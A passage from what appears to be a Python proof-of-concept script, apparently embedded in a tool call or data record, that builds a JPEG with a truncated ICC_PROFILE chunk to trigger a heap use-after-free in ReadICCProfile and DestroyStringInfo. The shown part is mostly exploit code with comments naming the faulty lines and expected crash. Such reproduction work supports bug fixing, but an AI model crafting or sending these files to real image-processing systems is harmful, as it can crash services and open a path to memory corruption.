e magic check\n    f.write(b"ICC_PROFILE\\x00")\n    \n    # ID and markers bytes (2 bytes)\n    f.write(b"\\x01")  # Chunk ID\n    f.write(b"\\x01")  # Total chunks\n    \n    # Now the actual profile data should follow (declared_length - 14 bytes)\n    # But we only write a few bytes and truncate to trigger EOF\n    # This will cause: i != (ssize_t) length in ReadICCProfile line 567\n    f.write(b"PARTIAL_ICC_DATA")  # Only 16 bytes instead of 86\n    \n    # File ends here (truncated) - this triggers the vulnerability:\n    # - ReadICCProfile hits EOF in the read loop\n    # - Frees profile at line 569 but doesn\'t clear error_manager->profile\n    # - Later setjmp recovery tries to free it again -> UAF\n\nprint(f"Generated malformed JPEG with truncated ICC profile at: {output_path}")\nprint(f"Expected behavior: heap-use-after-free in DestroyStringInfo")\n'}
